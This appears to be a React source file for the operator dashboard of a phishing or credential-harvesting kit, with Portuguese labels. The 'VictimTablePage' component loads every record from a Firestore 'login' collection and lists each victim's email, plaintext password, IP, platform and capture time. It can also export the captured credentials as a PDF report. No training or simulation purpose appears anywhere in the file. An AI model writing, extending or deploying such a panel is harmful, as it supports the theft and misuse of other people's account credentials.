import React, { useEffect, useState } from "react";
import {
  Box,
  Container,
  Typography,
  Paper,
  Table,
  TableHead,
  TableRow,
  TableCell,
  TableBody,
  CircularProgress,
  Button,
} from "@mui/material";
import { collection, getDocs } from "firebase/firestore";
import { db } from "../services/firebase";
import { useNavigate } from "react-router-dom";
import jsPDF from "jspdf";
import autoTable from "jspdf-autotable";

const VictimTablePage: React.FC = () => {
  const [dados, setDados] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchData = async () => {
      try {
        const querySnapshot = await getDocs(collection(db, "login"));
        const lista = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        }));
        setDados(lista);
      } catch (error) {
        console.error("Erro ao buscar dados:", error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  const exportarPDF = () => {
    const doc = new jsPDF();

    doc.setFontSize(18);
    doc.text("Relatório de Dados Capturados", 14, 22);

    autoTable(doc, {
      startY: 30,
      head: [["Email", "Senha", "IP", "Plataforma", "Horário"]],
      body: dados.map((item) => [
        item.email,
        item.senha,
        item.ip,
        item.plataforma,
        item.hora?.toDate().toLocaleString() || "",
      ]),
      styles: { fontSize: 10 },
      headStyles: { fillColor: [94, 53, 177] }, // roxo
    });

    doc.save("dados-capturados.pdf");
  };

  return (
    <Box
      sx={{
        height: "100vh",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        backgroundColor: "#ede7f6",
        padding: 2,
      }}
    >
      <Container maxWidth="md">
        <Paper
          elevation={3}
          sx={{ padding: 4, backgroundColor: "#f4f0fa", borderRadius: 2 }}
        >
          <Typography
            variant="h4"
            align="center"
            gutterBottom
            sx={{ color: "#5e35b1", fontWeight: "bold" }}
          >
            Dados Capturados
          </Typography>

          {loading ? (
            <Box display="flex" justifyContent="center" mt={4}>
              <CircularProgress />
            </Box>
          ) : (
            <Box mt={4} display="flex" justifyContent="center" overflow="auto">
              <Table sx={{ minWidth: 600 }}>
                <TableHead>
                  <TableRow>
                    <TableCell sx={{ color: "#8e24aa", fontWeight: "bold" }}>
                      Email
                    </TableCell>
                    <TableCell sx={{ color: "#3949ab", fontWeight: "bold" }}>
                      Senha
                    </TableCell>
                    <TableCell sx={{ color: "#00897b", fontWeight: "bold" }}>
                      IP
                    </TableCell>
                    <TableCell sx={{ color: "#f4511e", fontWeight: "bold" }}>
                      Plataforma
                    </TableCell>
                    <TableCell sx={{ color: "#6d4c41", fontWeight: "bold" }}>
                      Horário
                    </TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {dados.map((item, index) => (
                    <TableRow key={index}>
                      <TableCell sx={{ color: "#8e24aa" }}>
                        {item.email}
                      </TableCell>
                      <TableCell sx={{ color: "#3949ab" }}>
                        {item.senha}
                      </TableCell>
                      <TableCell sx={{ color: "#00897b" }}>{item.ip}</TableCell>
                      <TableCell sx={{ color: "#f4511e" }}>
                        {item.plataforma}
                      </TableCell>
                      <TableCell sx={{ color: "#6d4c41" }}>
                        {item.hora?.toDate().toLocaleString()}
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </Box>
          )}

          <Box
            textAlign="center"
            mt={4}
            display="flex"
            justifyContent="center"
            gap={2}
          >
            <Button
              variant="contained"
              sx={{ backgroundColor: "#7e57c2" }}
              onClick={() => navigate("/")}
            >
              Voltar
            </Button>
            <Button
              variant="outlined"
              sx={{ borderColor: "#7e57c2", color: "#7e57c2" }}
              onClick={exportarPDF}
            >
              Exportar PDF
            </Button>
          </Box>
        </Paper>
      </Container>
    </Box>
  );
};

export default VictimTablePage;
